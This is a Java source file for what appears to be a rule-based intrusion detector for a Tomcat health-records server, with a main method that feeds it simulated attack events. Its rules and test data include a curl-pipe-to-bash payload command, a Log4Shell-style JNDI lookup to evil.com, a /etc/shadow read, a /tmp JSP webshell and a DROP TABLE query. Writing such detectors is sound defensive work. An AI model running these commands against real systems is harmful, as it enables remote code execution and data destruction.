import java.util.*;
import java.security.MessageDigest;

class Event {
    String id, action, className, command, target, file, uid, query, user, reason, thread, apiPath, ip, host;
    int rowsReturned, poolSize;
    long timestamp, heapUsedMb;

    public Event(String id, String action, long timestamp) {
        this.id = id; this.action = action; this.timestamp = timestamp;
    }
}

class Alert {
    String severity, description;
    public Alert(String severity, String description) {
        this.severity = severity; this.description = description;
    }
}

class Detector {
    List<Event> eventMonitor = new ArrayList<>();
    Map<String, List<Integer>> dbmsPoolHistory = new HashMap<>();

    public String hash(String input) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(input.getBytes("UTF-8"));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) hexString.append(String.format("%02x", b));
            return hexString.toString();
        } catch (Exception e) { return null; }
    }

    public Alert evaluateAtomicRules(Event event) {
        if ("JVMTI_ClassLoad".equals(event.action) && "Exploit.class".equals(event.className))
            return new Alert("CRITICAL", "Malicious dynamic class load (Webshell/Deserialization).");

        if ("ProcessBuilder_Exec".equals(event.action) && event.command != null && event.command.matches(".*(curl|wget).*\\|.*bash.*"))
            return new Alert("CRITICAL", "Remote payload download and execution pipeline.");

        if ("JNDI_Lookup".equals(event.action) && event.target != null && event.target.startsWith("ldap://"))
            return new Alert("CRITICAL", "JNDI LDAP lookup (Potential Log4Shell).");

        if ("FILE_CREATE".equals(event.action) && event.file != null && event.file.endsWith(".jsp") && event.file.startsWith("/tmp"))
            return new Alert("HIGH", "JSP webshell staging in /tmp.");

        if ("FILE_READ_DENIED".equals(event.action) && "/etc/shadow".equals(event.file))
            return new Alert("HIGH", "Unauthorized access attempt to shadow file.");

        if ("SQL_DDL_Execution".equals(event.action) && event.query != null && event.query.toUpperCase().contains("DROP TABLE"))
            return new Alert("HIGH", "Destructive SQL DDL (DROP) command.");

        if ("SQL_DML_Bulk_Extraction".equals(event.action) && event.rowsReturned > 10000)
            return new Alert("HIGH", "Mass DB extraction: >10,000 rows.");

        if ("Auth_Failed_DBMS".equals(event.action) && "root".equals(event.user))
            return new Alert("MEDIUM", "DB auth failed for root user.");

        if ("Java_OutOfMemoryError".equals(event.action))
            return new Alert("MEDIUM", "JVM OutOfMemoryError (DoS/leak).");

        if ("Spring_Actuator_Access".equals(event.action) && event.apiPath != null && event.apiPath.contains("/actuator/env"))
            return new Alert("MEDIUM", "Spring environment actuator accessed.");

        if ("API_Rate_Limit_Exceeded".equals(event.action))
            return new Alert("INFO", "API rate limit exceeded.");
            
        if ("sys_execve".equals(event.action) && event.command != null && "/usr/sbin/sshd".equals(event.command)) {
             String expectedHash = "f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2";
             if(event.file != null && !event.file.equals(expectedHash))
                return new Alert("CRITICAL", "Binary Integrity Failure (SHA-256 Mismatch).");
        }

        return null;
    }

    public Alert evaluateBaselineDeviation(Event event) {
        if ("JDBC_Connection_Create".equals(event.action) && event.target != null) {
            dbmsPoolHistory.putIfAbsent(event.target, new ArrayList<>());
            List<Integer> history = dbmsPoolHistory.get(event.target);
            
            if (history.size() > 5) {
                double mean = history.stream().mapToInt(Integer::intValue).average().orElse(0);
                double variance = history.stream().mapToDouble(val -> Math.pow(val - mean, 2)).average().orElse(0);
                double stdDev = Math.sqrt(variance);

                if (stdDev > 0 && event.poolSize > (mean + (3 * stdDev))) {
                    history.add(event.poolSize);
                    return new Alert("HIGH", String.format("Pool size anomaly -> Val: %d, Mean: %.2f, StdDev: %.2f", event.poolSize, mean, stdDev));
                }
            }
            history.add(event.poolSize);
        }
        return null;
    }

    public Alert evaluateCorrelations(Event event) {
        eventMonitor.add(event);
        long now = event.timestamp;
        
        long bruteForceCount = eventMonitor.stream()
            .filter(e -> "Auth_Failed_Java_App".equals(e.action) && e.ip != null && e.ip.equals(event.ip) && (now - e.timestamp) < 600000)
            .count();
        boolean hasSuccess = eventMonitor.stream()
            .anyMatch(e -> "Auth_Success_Java_App".equals(e.action) && e.ip != null && e.ip.equals(event.ip) && (now - e.timestamp) < 300000);
        boolean hasExfil = eventMonitor.stream()
            .anyMatch(e -> "SQL_DML_Bulk_Extraction".equals(e.action) && e.ip != null && e.ip.equals(event.ip) && (now - e.timestamp) < 300000);
        
        if (bruteForceCount >= 3 && hasSuccess && hasExfil)
            return new Alert("CRITICAL", "Credential brute-forcing followed by exfiltration.");

        boolean hasJspCreate = eventMonitor.stream()
            .anyMatch(e -> "FILE_CREATE".equals(e.action) && e.host != null && e.host.equals(event.host) && e.file != null && e.file.endsWith(".jsp") && (now - e.timestamp) < 30000);
        boolean hasProcExec = eventMonitor.stream()
            .anyMatch(e -> "ProcessBuilder_Exec".equals(e.action) && e.host != null && e.host.equals(event.host) && "java".equals(e.user) && (now - e.timestamp) < 30000);

        if (hasJspCreate && hasProcExec)
            return new Alert("CRITICAL", "Webshell deployment leading to immediate command execution.");

        long apiExceededCount = eventMonitor.stream()
            .filter(e -> "API_Rate_Limit_Exceeded".equals(e.action) && e.ip != null && e.ip.equals(event.ip) && (now - e.timestamp) < 120000)
            .count();
        boolean hasOOM = eventMonitor.stream()
            .anyMatch(e -> "Java_OutOfMemoryError".equals(e.action) && e.host != null && e.host.equals(event.host) && (now - e.timestamp) < 120000);

        if (apiExceededCount >= 5 && hasOOM)
            return new Alert("HIGH", "Volumetric API abuse resulting in JVM Heap exhaustion.");

        return null;
    }

    public Alert processEvent(Event e) {
        Alert a = evaluateAtomicRules(e);
        if (a != null) return a;
        a = evaluateBaselineDeviation(e);
        if (a != null) return a;
        return evaluateCorrelations(e);
    }
}

public class ExecutionPipeline {
    public static void main(String[] args) {
        Detector detector = new Detector();
        
        // Seed baseline history
        for(int i=0; i<10; i++) {
            Event base = new Event("B" + i, "JDBC_Connection_Create", 0);
            base.target = "ehr_prod";
            base.poolSize = 10 + (i % 3);
            detector.evaluateBaselineDeviation(base);
        }

        List<Event> events = new ArrayList<>();
        
        Event e1 = new Event("Evt1", "FILE_APPEND", 1000); e1.file = "/var/log/tomcat/catalina.out"; events.add(e1);
        Event e2 = new Event("Evt2", "JVMTI_ClassLoad", 2000); e2.className = "Exploit.class"; events.add(e2);
        Event e3 = new Event("Evt3", "ProcessBuilder_Exec", 3000); e3.command = "sh -c 'curl 10.0.0.5/payload.sh | bash'"; e3.user = "java"; e3.host = "ServerA"; events.add(e3);
        Event e4 = new Event("Evt4", "FILE_READ", 4000); e4.file = "/tmp/hsperfdata_root/4102"; events.add(e4);
        Event e5 = new Event("Evt5", "FILE_READ", 5000); e5.file = "/opt/ehr/config/application.properties"; events.add(e5);
        Event e6 = new Event("Evt6", "FILE_CREATE", 6000); e6.file = "/tmp/webshell.jsp"; e6.host = "ServerA"; events.add(e6);
        Event e7 = new Event("Evt7", "Java_OutOfMemoryError", 7000); e7.host = "ServerB"; events.add(e7);
        Event e8 = new Event("Evt8", "FILE_READ_DENIED", 8000); e8.file = "/etc/shadow"; events.add(e8);
        Event e9 = new Event("Evt9", "JNDI_Lookup", 9000); e9.target = "ldap://evil.com/a"; events.add(e9);
        Event e10 = new Event("Evt10", "FILE_OPEN", 10000); e10.file = "/opt/ehr/lib/log4j-core-2.14.0.jar"; events.add(e10);
        Event e11 = new Event("Evt11", "Auth_Failed_Java_App", 11000); e11.ip = "192.168.1.100"; events.add(e11);
        Event e12 = new Event("Evt12", "Auth_Failed_Java_App", 12000); e12.ip = "192.168.1.100"; events.add(e12);
        Event e13 = new Event("Evt13", "Auth_Failed_Java_App", 13000); e13.ip = "192.168.1.100"; events.add(e13);
        Event e14 = new Event("Evt14", "Auth_Success_Java_App", 14000); e14.ip = "192.168.1.100"; events.add(e14);
        Event e15 = new Event("Evt15", "SQL_DML_Bulk_Extraction", 15000); e15.ip = "192.168.1.100"; e15.rowsReturned = 15000; events.add(e15);
        Event e16 = new Event("Evt16", "JDBC_Connection_Create", 16000); e16.poolSize = 45; e16.target = "ehr_prod"; events.add(e16);
        Event e17 = new Event("Evt17", "Spring_Actuator_Access", 17000); e17.apiPath = "/actuator/env"; events.add(e17);
        Event e18 = new Event("Evt18", "Auth_Failed_DBMS", 18000); e18.user = "root"; events.add(e18);
        Event e19 = new Event("Evt19", "SQL_DDL_Execution", 19000); e19.query = "DROP TABLE patient_records;"; events.add(e19);
        Event e20 = new Event("Evt20", "sys_execve", 20000); e20.command = "/usr/sbin/sshd"; e20.file = "BAD_HASH_123"; events.add(e20);

        int cCritical = 0, cHigh = 0, cMedium = 0, cInfo = 0, cBenign = 0;

        for (Event e : events) {
            String logHash = detector.hash(e.timestamp + e.action);
            Alert a = detector.processEvent(e);
            
            if (a != null) {
                System.out.printf("[%s] [SHA-256: %s...] %s: %s%n", a.severity, logHash.substring(0,8), e.action, a.description);
                switch(a.severity) {
                    case "CRITICAL": cCritical++; break;
                    case "HIGH": cHigh++; break;
                    case "MEDIUM": cMedium++; break;
                    case "INFO": cInfo++; break;
                }
            } else {
                cBenign++;
            }
        }

        System.out.println("\nSeverity Distribution Summary:");
        System.out.println("CRITICAL: " + cCritical);
        System.out.println("HIGH:     " + cHigh);
        System.out.println("MEDIUM:   " + cMedium);
        System.out.println("INFO:     " + cInfo);
        System.out.println("BENIGN:   " + cBenign);
    }
}
